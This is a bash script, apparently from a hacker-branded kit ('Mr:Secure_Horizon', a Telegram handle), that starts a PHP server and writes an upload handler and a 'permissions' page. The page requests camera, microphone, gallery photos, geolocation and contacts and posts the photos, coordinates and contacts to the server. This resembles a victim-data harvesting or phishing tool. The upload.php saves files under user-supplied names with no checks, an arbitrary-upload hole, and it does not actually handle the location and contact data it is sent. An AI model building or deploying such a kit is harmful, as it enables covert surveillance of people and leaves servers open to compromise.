#!/bin/bash

# Colors for the script
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Animated Banner with Dynamic Status
animate() {
  frames=("⢀⠀⡀" "⣀⡀" "⣤⡀" "⣦⡀" "⣷⡀" "⣿⡀" "⣿⣷" "⣿⣿" "⣿⣷" "⣿⡀" "⣷⡀" "⣦⡀" "⣤⡀" "⣀⡀" "⢀⠀⡀")
  for frame in "${frames[@]}"; do
    echo -ne "\r${CYAN}Loading... ${frame} ${NC}"
    sleep 0.1
  done
  echo -e "\r${GREEN}✔ Secure Horizon Server Initialized!${NC}"
}

# Banner
echo "⢀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣴⣴⣾⣾⣾⣿⣿⣾⣿⣾⣿⣷⣷⣷⣷⣦⣦⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢿⢛⢏⢟⢟⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡟⢝⢟⢿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⣏⣔⣴⣰⢄⢌⠘⠽⣿⣿⣿⣿⡿⠏⢃⢡⣠⣢⣢⣌⣻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣮⡢⣮⣿⣿⣿⣮⢪⣾⣾⣿⣿⣿⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢿⣟⠽⠊⠊⠊⠫⢻⣾⣿⣿⣿⣷⠻⠙⠘⠘⠚⢽⢿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣵⣷⣽⣪⣞⣮⣮⣾⣿⣾⣿⣯⣿⣷⣵⣲⣲⣳⣵⣷⣷⣻⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢗⣿⣿⣿⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣿⣿⣿⣿⣿⣿⢟⣿⣽⣟⣿⣿⣿⢾⣾⢿⡻⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣕⢭⠹⣾⣾⣿⣿⣏⡻⡽⣟⡟⣏⣿⣿⣿⣾⡾⠍⣕⢧⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣝⢦⡈⠟⠟⠟⠏⠁⣠⣦⡀⠈⠛⠟⠟⠟⢀⡾⣣⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣎⢷⣷⣶⣵⣮⣦⣫⣫⣫⣦⣵⣶⣵⣾⢾⣱⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣯⣷⣿⣿⣿⣿⡛⠛⣻⣿⣿⣿⣿⣟⣵⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣷⣿⣿⣿⣿⡏⠀⢻⣿⣿⣿⣿⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡅⠀⣸⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣧⢀⣾⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ☠⠀Mr:Secure_Horizon⠀️☠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "      Telegram : @Unknownhacker2005"
echo "      ☠ Mr:Secure_Horizon ☠"
echo "      Localhost Web Server Script"
echo "      Developed by Secure Horizon"
echo "      Telegram: @Unknownhacker2005"
echo "------------------------------------------------------"
echo "      ANONYMOUS Secure_Horizon | GoogleLLc IP Checker"
echo "------------------------------------------------------"
echo "      Developer: Secure_Horizon"
echo "      @Unknownhacker2005"
echo "------------------------------------------------------"
echo -e "\033[0m"

animate

echo -e "${CYAN}Starting Localhost Web Server...${NC}"

# Generate a random port number between 8000 and 8999
PORT=$((RANDOM % 1000 + 8000))
echo -e "${GREEN}Randomized Port: $PORT${NC}"

# Create the necessary directories
if [ ! -d "uploads/photos" ]; then
    mkdir -p uploads/photos
    echo -e "${GREEN}Created directory: uploads/photos${NC}"
fi

if [ ! -d "uploads/audio" ]; then
    mkdir -p uploads/audio
    echo -e "${GREEN}Created directory: uploads/audio${NC}"
fi

echo -e "${GREEN}Server is running at http://127.0.0.1:$PORT${NC}"

# Check for the custom HTML file
if [ -f "index.html" ]; then
    echo -e "${GREEN}Custom index.html file found. Using it for the web server.${NC}"
else
    echo -e "${RED}Custom index.html not found! Please ensure it's in the same directory as the script.${NC}"
    exit 1
fi

# Create the PHP file to handle uploads
cat << 'EOF' > upload.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['photo'])) {
        $fileName = 'uploads/photos/' . time() . '_' . $_FILES['photo']['name'];
        move_uploaded_file($_FILES['photo']['tmp_name'], $fileName);
        echo json_encode(['status' => 'success', 'file' => $fileName]);
    } elseif (isset($_FILES['audio'])) {
        $fileName = 'uploads/audio/' . time() . '_' . $_FILES['audio']['name'];
        move_uploaded_file($_FILES['audio']['tmp_name'], $fileName);
        echo json_encode(['status' => 'success', 'file' => $fileName]);
    }
}
?>
EOF

# Create a new HTML file for permission handling and additional features
cat << 'EOF' > permissions.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Horizon Permissions</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; }
        button { padding: 10px 20px; margin: 5px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #45a049; }
        #gallery { display: flex; flex-wrap: wrap; gap: 10px; }
        #gallery img { max-width: 200px; height: auto; }
        #location, #contacts { margin-top: 20px; }
    </style>
</head>
<body>
    <h1>Secure Horizon Permissions</h1>
    <button onclick="requestCameraMic()">Request Camera & Microphone</button>
    <button onclick="requestGallery()">Upload from Gallery</button>
    <button onclick="requestLocation()">Get Location</button>
    <button onclick="requestContacts()">Access Contacts</button>
    
    <div id="gallery"></div>
    <div id="location"></div>
    <div id="contacts"></div>

    <script>
        // Request Camera and Microphone Permissions
        async function requestCameraMic() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                alert('Camera and Microphone access granted!');
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                document.body.appendChild(video);
            } catch (err) {
                alert('Error accessing camera/microphone: ' + err.message);
            }
        }

        // Request Gallery (File Upload)
        function requestGallery() {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.onchange = function(event) {
                const file = event.target.files[0];
                if (file) {
                    const formData = new FormData();
                    formData.append('photo', file);
                    fetch('upload.php', { method: 'POST', body: formData })
                        .then(response => response.json())
                        .then(data => {
                            if (data.status === 'success') {
                                const img = document.createElement('img');
                                img.src = data.file;
                                document.getElementById('gallery').appendChild(img);
                            }
                        });
                }
            };
            input.click();
        }

        // Request Location Permission
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const { latitude, longitude } = position.coords;
                        document.getElementById('location').innerHTML = 
                            `Latitude: ${latitude}, Longitude: ${longitude}`;
                        // Send location to server (optional)
                        fetch('upload.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ latitude, longitude })
                        });
                    },
                    error => alert('Error getting location: ' + error.message)
                );
            } else {
                alert('Geolocation is not supported by this browser.');
            }
        }

        // Request Contacts Permission (Note: Limited support in browsers)
        async function requestContacts() {
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    const contactsDiv = document.getElementById('contacts');
                    contacts.forEach(contact => {
                        contactsDiv.innerHTML += `<p>Name: ${contact.name}, Tel: ${contact.tel}</p>`;
                    });
                    // Send contacts to server (optional)
                    fetch('upload.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(contacts)
                    });
                } catch (err) {
                    alert('Error accessing contacts: ' + err.message);
                }
            } else {
                alert('Contacts API is not supported by this browser.');
            }
        }
    </script>
</body>
</html>
EOF

# Start the PHP server with the randomized port
php -S 127.0.0.1:$PORT

echo -e "${RED}Press Ctrl+C to stop the server.${NC}"